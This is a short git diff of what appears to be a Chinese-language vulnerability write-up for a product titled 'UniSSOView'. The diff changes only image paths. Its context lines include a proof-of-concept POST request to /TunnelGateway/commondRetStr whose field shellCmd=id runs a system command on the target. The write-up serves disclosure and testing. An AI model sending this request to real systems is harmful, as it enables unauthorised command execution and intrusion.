@@ -20,7 +20,7 @@ title="UniSSOView"
 
 登录页面
 
-![image-20230314090312164](images/image-20230314090312164.png)
+![image-20230314090312164](../.gitbook/assets/image-20230314090312164.png)
 
 验证POC
 
@@ -30,4 +30,4 @@ POST /TunnelGateway/commondRetStr
 shellCmd=id
 ```
 
-![image-20230314090322883](images/image-20230314090322883.png)
+![image-20230314090322883](../.gitbook/assets/image-20230314090322883.png)
